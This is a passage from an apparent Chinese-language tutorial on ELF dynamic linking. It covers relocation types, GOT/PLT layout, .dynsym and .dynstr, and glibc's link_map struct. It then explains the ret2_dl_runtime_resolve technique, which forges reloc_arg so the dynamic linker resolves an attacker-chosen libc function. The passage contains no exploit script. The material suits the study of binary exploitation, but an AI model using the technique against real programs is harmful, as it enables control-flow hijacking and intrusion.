节头项标识）。节中指定了这些关系。如果<code>可重定位目标文件</code>中存在<code>重定位节</code>，则需要 <code>sh_info</code> 项，但对于<code>可执行文件</code>和<code>共享目标文件</code>，该项是<code>可选的</code>。<code>重定位偏移(r_offset)</code>满足执行重定位的要求。<code>不同的ELF文件</code>中,重定位项的 <code>r_offset</code> 成员的<code>含义</code>略有不同,但其重定位的<code>作用</code>是不变的。<br>&emsp;&emsp;在所有情况下，<code>r_offset</code> 值都会指定<code>受影响存储单元</code>的<code>第一个字节</code>的<code>偏移</code>或<code>虚拟地址</code>。<code>重定位类型</code>可指定<code>要更改的位</code>以及<code>计算这些位的值</code>的方法。</p>
<blockquote>
<ul>
<li>1、<strong><code>重定位文件(.o)</code></strong>中,<code>r_offset</code> 成员含有一个<code>节偏移量</code>。也就是说,重定位节本身描述的是如何修改文件中的另一个节的内容,重定位偏移量(r_offset)指向了另一个节中的一个存储单元地址。 [<a href="#Ref2">2</a>]</li>
<li>2、在<strong><code>可执行文件</code></strong>或<strong><code>共享目标文件(.so)</code></strong>中,<code>r_offset</code> 含有的是<code>符号定义</code>在进程空间中的<code>虚拟地址</code>。<code>可执行文件</code>和<code>共享目标文件</code>是用于<code>运行程序</code>而不是<code>构建程序</code>的,所以对它们来说更有用的信息是运行期的内存虚拟地址,而不是某个符号定义在文件中的位置。[<a href="#Ref2">2</a>]</li>
</ul>
</blockquote>
<p><strong><code>重定位类型(Relocation Types)</code></strong><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* i386 relocs.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_NONE     0  <span class="comment">/* No reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_32       1  <span class="comment">/* Direct 32 bit  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_PC32     2  <span class="comment">/* PC relative 32 bit */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_GOT32    3  <span class="comment">/* 32 bit GOT entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_PLT32    4  <span class="comment">/* 32 bit PLT address */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_COPY     5  <span class="comment">/* Copy symbol at runtime */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_GLOB_DAT 6  <span class="comment">/* Create GOT entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_JMP_SLOT 7  <span class="comment">/* Create PLT entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_386_RELATIVE 8  <span class="comment">/* Adjust by program base */</span></span></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="comment">/* AMD x86-64 relocations.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_NONE      0  <span class="comment">/* No reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_64        1  <span class="comment">/* Direct 64 bit  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_PC32      2  <span class="comment">/* PC relative 32 bit signed */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_GOT32     3  <span class="comment">/* 32 bit GOT entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_PLT32     4  <span class="comment">/* 32 bit PLT address */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_COPY      5  <span class="comment">/* Copy symbol at runtime */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_GLOB_DAT  6  <span class="comment">/* Create GOT entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_JUMP_SLOT 7  <span class="comment">/* Create PLT entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_RELATIVE  8  <span class="comment">/* Adjust by program base */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R_X86_64_GOTPCREL  9  <span class="comment">/* 32 bit signed PC relative offset to GOT */</span></span></span><br><span class="line">......</span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;<strong><code>32位ELF</code></strong>一般用来函数重定位的重定位类型就是<code>R_386_JMP_SLOT</code>类型,<strong><code>64位ELF</code></strong>函数重定位的重定位类型就是<code>R_X86_64_JUMP_SLOT</code>类型，源码对其的注释是<code>Create PLT entry</code>。这种类型的<code>函数重定位</code>都会在ELF中创建一个<code>PLT入口</code>。</p>
<h3 id="2-4、“-got”节和“-got-plt”节"><a href="#2-4、“-got”节和“-got-plt”节" class="headerlink" title="2.4、“.got”节和“.got.plt”节"></a>2.4、“.got”节和“.got.plt”节</h3><p><strong><code>GOT表</code></strong>在ELF文件中分为<code>两个部分</code>：</p>
<blockquote>
<ul>
<li><strong><code>.got</code></strong>：存储对<code>全局变量</code>的引用。</li>
<li><strong><code>.got.plt</code></strong>：存储对<code>函数</code>的引用。</li>
</ul>
</blockquote>
<p>前面讲<code>延迟绑定</code>的时候讲过，<strong><code>.got.plt</code></strong>的<code>前三项</code>具有特殊的含义：</p>
<blockquote>
<ul>
<li><strong><code>GOT[0]</code></strong>：保存的是<code>“.dynamic”节</code>的地址。</li>
<li><strong><code>GOT[1]</code></strong>：保存的是<code>本模块的ID</code>。指向内部类型为<code>link_map的指针</code>，只会在<code>动态链接器</code>中使用，包含了进行<code>符号解析</code>需要的<code>当前ELF共享目标文件</code>的信息。每个 <code>link_map</code>都是一条<code>双向链表</code>的一个节点，而这个链表保存了所有加载的<code>ELF共享目标文件</code>的信息。<code>动态链接器</code>利用<code>该地址</code>来对<code>符号</code>进行解析。</li>
<li><strong><code>GOT[2]</code></strong>：保存的是<code>_dl_runtime_resolve()</code>的地址。</li>
</ul>
</blockquote>
<p>&emsp;&emsp;<strong><code>解析之前</code></strong>，GOT表的<code>其他表项</code>存储的是所解析函数对应的<code>PLT表项第二条指令的地址</code>。<strong><code>解析之后</code></strong>，存储的是<code>函数的真实地址</code>。</p>
<h3 id="2-5、“-dynsym”节"><a href="#2-5、“-dynsym”节" class="headerlink" title="2.5、“.dynsym”节"></a>2.5、“.dynsym”节</h3><p>&emsp;&emsp;<strong><code>“.dynsym”节</code></strong>是<code>动态链接符号表</code>。这里保存的是一个<code>结构体数组</code>，结构体的<code>定义</code>如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Symbol table entry.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word    st_name;  <span class="comment">/* 符号名，符号在字符串表中的偏移 */</span></span><br><span class="line">    Elf32_Addr    st_value; <span class="comment">/* 符号的值，可能是地址或偏移 */</span></span><br><span class="line">    Elf32_Word    st_size;  <span class="comment">/* 符号的大小 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;  <span class="comment">/* 符号类型及绑定属性 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; <span class="comment">/* 符号的可见性 */</span></span><br><span class="line">    Elf32_Section st_shndx; <span class="comment">/* 节头表索引 */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  Elf64_Word    st_name;  <span class="comment">/* 符号名，符号在字符串表中的偏移 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;  <span class="comment">/* 符号类型及绑定属性 */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; <span class="comment">/* 符号的可见性 */</span></span><br><span class="line">  Elf64_Section st_shndx; <span class="comment">/* 节头表索引 */</span></span><br><span class="line">  Elf64_Addr    st_value; <span class="comment">/* 符号的值，可能是地址或偏移 */</span></span><br><span class="line">  Elf64_Xword   st_size;  <span class="comment">/* 符号的大小 */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* st_info字段中符号类型和绑定属性的提取 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_BIND(val) (((unsigned char) (val)) &gt;&gt; 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_TYPE(val) ((val) &amp; 0xf)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_INFO(bind, type) (((bind) &lt;&lt; 4) + ((type) &amp; 0xf))</span></span><br><span class="line"><span class="comment">/* Elf32_Sym和Elf64_Sym都使用相同的一字节的st_info字段 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_BIND(val) ELF32_ST_BIND (val)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_TYPE(val) ELF32_ST_TYPE (val)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_ST_INFO(bind, type) ELF32_ST_INFO ((bind), (type))</span></span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;我们主要关注此结构体中的<strong><code>两个成员</code></strong>(注意<code>32位</code>和<code>64位</code>中这两个值在结构体里的<code>位置</code>不一样！)</p>
<blockquote>
<ul>
<li><strong><code>st_name</code></strong>：该成员保存着符号在<code>.dynstr表</code>（动态链接字符串表）中的<code>偏移</code>。</li>
<li><strong><code>st_value</code></strong>：如果这个符号<code>被导出</code>，这个符号保存着对应的<code>虚拟地址</code>。</li>
</ul>
</blockquote>
<p>&emsp;&emsp;<strong><code>st_other</code></strong>：st_other 变量定义了<code>符号的可见性</code>。</p>
<p><strong><code>符号可见性规范</code></strong>：<a href="https://www.ibm.com/developerworks/cn/aix/library/au-aix-symbol-visibility/" target="_blank" rel="noopener">第 1 部分 - 符号可见性简介</a></p>
<blockquote>
<ul>
<li><strong><code>STV_DEFAULT(0)</code></strong>：默认符号可见性规则。用它定义的符号将被导出。换句话说，它声明符号是到处可见的。</li>
<li><strong><code>STV_INTERNAL(1)</code></strong>：特定于处理器的隐藏类。符号在当前可执行文件或共享库之外不可访问。</li>
<li><strong><code>STV_HIDDEN(2)</code></strong>：Sym在其他模块中不可用。用它定义的符号将不被导出，并且不能从其他对象进行使用。</li>
<li><strong><code>STV_PROTECTED(3)</code></strong>：不可抢占，不可导出。符号在当前可执行文件或共享对象之外可见，但是不会被覆盖。换句话说，如果共享库中的一个受保护符号被该共享库中的另一个代码引用，那么此代码将总是引用共享库中的此符号，即便可执行文件定义了相同名称的符号。</li>
</ul>
</blockquote>
<p>&emsp;&emsp;<strong><code>st_shndx</code></strong>：每个<code>符号表条目的定义</code>都与<code>某些节</code>对应。<code>st_shndx</code>变量保存了相关<code>节头表的索引</code>。</p>
<p><strong><code>特殊节索引</code></strong>：<a href="https://docs.oracle.com/cd/E19683-01/817-3677/chapter6-94076/index.html" target="_blank" rel="noopener">Linker and Libraries Guide</a></p>
<table>
<thead>
<tr>
<th style="text-align:left">宏定义</th>
<th style="text-align:center">值</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">SHN_UNDEF</td>
<td style="text-align:center">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  0x0000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</td>
<td style="text-align:left">未定义的、丢失的、不相关的或其他没有意义的节引用。例如，相对于节号SHN_UNDEF定义的符号是未定义的符号。该符号在本目标文件中被引用到，但是定义在其他目标文件中。</td>
</tr>
<tr>
<td style="text-align:left">SHN_LORESERVE</td>
<td style="text-align:center">0xFF00</td>
<td style="text-align:left">被保留索引号区间的下限。</td>
</tr>
<tr>
<td style="text-align:left">SHN_LOPROC</td>
<td style="text-align:center">0xFF00</td>
<td style="text-align:left">为特定处理器定制节所保留的索引号区间的下限。</td>
</tr>
<tr>
<td style="text-align:left">SHN_BEFORE</td>
<td style="text-align:center">0xFF00</td>
<td style="text-align:left">优先于其他节的排序节(Solaris)。与SHF_LINK_ORDER和SHF_ORDERED节标志一起规定初始和最终节顺序。</td>
</tr>
<tr>
<td style="text-align:left">SHN_AFTER</td>
<td style="text-align:center">0xFF01</td>
<td style="text-align:left">在其他节之后的排序节(Solaris)。与SHF_LINK_ORDER和SHF_ORDERED节标志一起规定初始和最终节顺序。</td>
</tr>
<tr>
<td style="text-align:left">SHN_HIPROC</td>
<td style="text-align:center">0xFF1F</td>
<td style="text-align:left">为特定处理器定制节所保留的索引号区间的上限。</td>
</tr>
<tr>
<td style="text-align:left">SHN_LOOS</td>
<td style="text-align:center">0xFF20</td>
<td style="text-align:left">为特定操作系统定制节所保留的索引号区间的下限。</td>
</tr>
<tr>
<td style="text-align:left">SHN_HIOS</td>
<td style="text-align:center">0xFF3F</td>
<td style="text-align:left">为特定操作系统定制节所保留的索引号区间的上限。</td>
</tr>
<tr>
<td style="text-align:left">SHN_ABS</td>
<td style="text-align:center">0xFFF1</td>
<td style="text-align:left">此节中所定义的符号有绝对的值,这个值不会因重定位而改变。</td>
</tr>
<tr>
<td style="text-align:left">SHN_COMMON</td>
<td style="text-align:center">0xFFF2</td>
<td style="text-align:left">相对于这个节定义的符号是公共符号，例如FORTRAN的COMMON块或未分配的C外部变量。这些符号有时被称为暂定符号。表示该符号是一个”COMMON块”的符号，一般来说，未初始化的全局符号定义就是这种类型的。</td>
</tr>
<tr>
<td style="text-align:left">SHN_XINDEX</td>
<td style="text-align:center">0xFFFF</td>
<td style="text-align:left">溢出值，指示实际的节头索引太大，所以存储在别处。当节头项中e_shstrndx的值是SHN_XINDEX时，表明真实的节头表索引值存储在第一个节头表表项(即节头表索引值为0)的成员sh_link中。</td>
</tr>
<tr>
<td style="text-align:left">SHN_HIRESERVE</td>
<td style="text-align:center">0xFFFF</td>
<td style="text-align:left">被保留索引号区间的上限。</td>
</tr>
</tbody>
</table>
<p>&emsp;&emsp;<strong><code>st_info</code></strong>指定<code>符号类型</code>及<code>绑定属性</code>。st_info的<strong><code>低四位</code></strong>表示<code>符号类型</code>，<strong><code>高四位</code></strong>表示<code>绑定属性</code>。符号类型以<code>STT</code>开头，符号绑定以<code>STB</code>开头，下面对几种常见的符号类型和符号绑定进行介绍。</p>
<p>1、<strong><code>符号类型</code></strong></p>
<blockquote>
<ul>
<li><strong><code>STT_NOTYPE(0)</code></strong>：符号类型<code>未定义</code>。</li>
<li><strong><code>STT_OBJECT(1)</code></strong>：表示该符号与<code>数据目标文件</code>关联。</li>
<li><strong><code>STT_FUNC(2)</code></strong>：表示该符号与<code>函数</code>或者<code>其他可执行代码</code>关联。</li>
</ul>
</blockquote>
<p>2、<strong><code>绑定属性</code></strong></p>
<blockquote>
<ul>
<li><strong><code>STB_LOCAL(0)</code></strong>：<code>本地符号</code>在<code>目标文件</code>之外是不可见的，<code>目标文件</code>包含了<code>符号的定义</code>，如一个声明为static的函数。</li>
<li><strong><code>STB_GLOBAL(1)</code></strong>：<code>全局符号</code>对于所有<code>要合并的目标文件</code>来说都是可见的。一个全局符号在<code>一个文件</code>中进行定义后，<code>另外一个文件</code>可以对这个符号进行引用。</li>
<li><strong><code>STB_WEAK(2)</code></strong>：与<code>全局绑定</code>类似，不过比<code>STB_GLOBAL</code>的<code>优先级低</code>。<code>被标记</code>为<code>STB_WEAK</code>的符号有可能会被<code>同名</code>的<code>未被标记</code>为<code>STB_WEAK</code>的符号<code>覆盖</code>。</li>
</ul>
</blockquote>
<h3 id="2-6、“-dynstr”节"><a href="#2-6、“-dynstr”节" class="headerlink" title="2.6、“.dynstr”节"></a>2.6、“.dynstr”节</h3><p>&emsp;&emsp;<strong><code>“.dynstr”</code></strong>是<code>动态链接字符串表</code>。其<code>第一个字节</code>为0，然后包含<code>动态链接</code>所需的字符串(导入函数名等)(<code>以\x00结尾</code>)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.dynstr:08048260 _dynstr segment byte public &apos;&apos; use32</span><br><span class="line">.dynstr:08048260         assume cs:_dynstr</span><br><span class="line">.dynstr:08048260         ;org 8048260h</span><br><span class="line">.dynstr:08048260         assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing</span><br><span class="line">.dynstr:08048260 byte_8048260    db 0             </span><br><span class="line">.dynstr:08048261 aGmonStart      db &apos;__gmon_start__&apos;,0   </span><br><span class="line">.dynstr:08048270 aLibcSo6        db &apos;libc.so.6&apos;,0</span><br><span class="line">.dynstr:0804827A aIoStdinUsed    db &apos;_IO_stdin_used&apos;,0   </span><br><span class="line">.dynstr:08048289 aStrncmp        db &apos;strncmp&apos;,0          </span><br><span class="line">.dynstr:08048291 aStrlen         db &apos;strlen&apos;,0           </span><br><span class="line">.dynstr:08048298 aRead           db &apos;read&apos;,0             </span><br><span class="line">.dynstr:0804829D aLibcStartMain  db &apos;__libc_start_main&apos;,0 </span><br><span class="line">.dynstr:080482AF aWrite          db &apos;write&apos;,0            </span><br><span class="line">.dynstr:080482B5 aGlibc20        db &apos;GLIBC_2.0&apos;,0</span><br><span class="line">.dynstr:080482BF                 align 10h</span><br><span class="line">.dynstr:080482BF _dynstr ends</span><br></pre></td></tr></table></figure></p>
<h2 id="3、ret2-dl-runtime-resolve利用原理"><a href="#3、ret2-dl-runtime-resolve利用原理" class="headerlink" title="3、ret2_dl_runtime_resolve利用原理"></a>3、ret2_dl_runtime_resolve利用原理</h2><h3 id="3-1、函数调用流程"><a href="#3-1、函数调用流程" class="headerlink" title="3.1、函数调用流程"></a>3.1、函数调用流程</h3><p>&emsp;&emsp;动态链接下<code>第一次调用</code>glibc的函数需要通过<code>PLT表</code>中的一段代码<code>解析函数的真实地址</code>，这也是ELF的<code>延迟绑定</code>的特点。具体的解析方式就是通过调用<strong><code>_dl_runtime_resolve(link_map_obj, reloc_arg)</code></strong> ，如果我们可以<code>控制</code>整个解析过程中的<code>参数</code>，那么就能解析<code>我们想要的函数地址</code>。以调用<code>printf函数</code>为例，回顾一下整个流程：</p>
<blockquote>
<ul>
<li>1、<strong><code>call printf@PLT</code></strong></li>
<li>2、<strong><code>jmp *(printf@GOT)</code></strong> -&gt; (第一次会jmp回来，解析之后就直接jmp到解析出来的地址了) -&gt; <strong><code>push n</code></strong> -&gt; <strong><code>jmp &amp;PLT[0]</code></strong> (跳到公共表项)</li>
<li>3、<strong><code>push GOT[1]</code></strong> (link_map可以理解为模块ID) -&gt; <strong><code>jmp *GOT[2]</code></strong> (跳转到_dl_runtime_resolve函数)<br>以上步骤相当于调用了<strong><code>_dl_runtime_resolve(link_map_obj, reloc_arg)</code></strong></li>
<li>4、<strong><code>解析完毕</code></strong>后会把解析出来的地址<code>写回</code>通过reloc_arg定位到的<code>.rel.plt表项的r_offset指向的位置</code>(其实就是<code>.got.plt</code>表中的对应项)</li>
</ul>
</blockquote>
<p>&emsp;&emsp;弄懂<code>_dl_runtime_resolve()</code>的解析过程后，就可以通过<code>伪造reloc_arg</code>来解析出<code>我们想要的libc函数地址</code>并且<code>写回可控区域</code>了。</p>
<h3 id="3-2、-dl-runtime-resolve-link-map-obj-reloc-arg-解析流程"><a href="#3-2、-dl-runtime-resolve-link-map-obj-reloc-arg-解析流程" class="headerlink" title="3.2、_dl_runtime_resolve(link_map_obj, reloc_arg)解析流程"></a>3.2、_dl_runtime_resolve(link_map_obj, reloc_arg)解析流程</h3><blockquote>
<ul>
<li>1、通过<code>link_map_obj</code>访问<strong><code>“.dynamic”节</code></strong>，分别取出<code>动态链接字符串表“.dynstr”</code>、<code>动态链接符号表“.dynsym”</code>、<code>重定位表“.rel.plt”的地址</code>。记为<strong><code>dynstr_addr</code></strong>、<strong><code>dynsym_addr</code></strong>、<strong><code>rel_plt_addr</code></strong>。</li>
<li>2、利用<strong><code>rel_plt_addr + reloc_index</code></strong>，求出<code>当前函数</code>重定位表项Elf32_Rel的指针，记为<strong><code>rel</code></strong>。</li>
<li>3、<code>rel-&gt;r_info</code>的<code>高24位</code>作为<code>动态链接符号表“.dynsym”</code>的下标，即利用<strong><code>dynsym_addr + ((rel-&gt;r_info)&gt;&gt;8)</code></strong>，求出<code>当前函数</code>动态链接符号表项Elf32_Sym的指针，记作<strong><code>sym</code></strong>。</li>
<li>4、<code>sym -&gt; st_name</code>作为<code>动态链接字符串表“.dynstr”</code>的下标，即利用<strong><code>dynstr_addr + (sym -&gt; st_name)</code></strong>，求出<code>当前函数</code>动态链接字符串表项在的指针，记作<strong><code>str</code></strong>。</li>
<li>5、在<code>动态链接库</code>查找这个函数的地址，并且把<code>找到的地址</code>赋值给<strong><code>rel-&gt;r_offset</code></strong>指向存储单元，即<strong><code>.got.plt</code></strong>中此函数的对应项。</li>
<li>6、最后<code>调用这个函数</code>。</li>
</ul>
</blockquote>
<h4 id="3-2-0、link-map结构体定义"><a href="#3-2-0、link-map结构体定义" class="headerlink" title="3.2.0、link_map结构体定义"></a>3.2.0、link_map结构体定义</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;link_map.h&gt;</span></span></span><br><span class="line"><span class="comment">/* 描述加载的共享库的结构体。“l_next”和“l_prev”成员构成了启动时加载的所有共享对象的链表。</span></span><br><span class="line"><span class="comment">   这些数据结构存在于运行时动态链接器使用的空间中。 修改它们可能会导致灾难性的后果。 如有</span></span><br><span class="line"><span class="comment">   必要，此数据结构将来可能会更改。 用户级程序必须避免定义这种类型的对象。 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 这些最初的几个成员是调试器协议的一部分。 这与SVR4中使用的格式相同。 */</span></span><br><span class="line">    ElfW(Addr) l_addr;  <span class="comment">/* ELF文件中的地址与内存中的地址之间的不同。共享文件加载基地址。 */</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;       <span class="comment">/* 绝对文件名 */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;    <span class="comment">/* 共享对象的动态节 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span>  <span class="comment">/* 加载的共享对象链表指针 */</span></span><br><span class="line">    <span class="comment">/* 以下所有成员都是动态链接器的内部组件，可能随时改变不受提醒 */</span></span><br><span class="line">    <span class="comment">/* 当在多个名称空间中使用ld.so时，该元素与指向该类型的相同副本的指针不同。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line">    <span class="comment">/* 该link map所属的命名空间个数 */</span></span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line">    <span class="comment">/* 指向“.dynamic”节的索引指针。</span></span><br><span class="line"><span class="comment">    这个数组用于快速访问动态节的信息，在lookup系列函数中会频繁使用。</span></span><br><span class="line"><span class="comment">    它的有关定义还包含了一系列用于访问信息的功能宏。 */</span></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">                    + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Phdr)</span> *l_phdr</span>;  <span class="comment">/* 指向程序头表的指针。 */</span></span><br><span class="line">    ElfW(Addr) l_entry;        <span class="comment">/* 入口点位置。 */</span></span><br><span class="line">    ElfW(Half) l_phnum;        <span class="comment">/* 程序头条目的数量。 */</span></span><br><span class="line">    ElfW(Half) l_ldnum;        <span class="comment">/* dynamic节条目数量 */</span></span><br><span class="line">    <span class="comment">/* DT_NEEDED依存项及其依存项的数组，按依赖关系查找符号（包含和不包含重复项）。 在加载依赖项之前，没有任何条目。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_searchlist</span>;</span></span><br><span class="line">    <span class="comment">/* 我们需要一个特殊的搜索列表来处理标记有DT_SYMBOLIC的对象。 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_symbolic_searchlist</span>;</span></span><br><span class="line">    <span 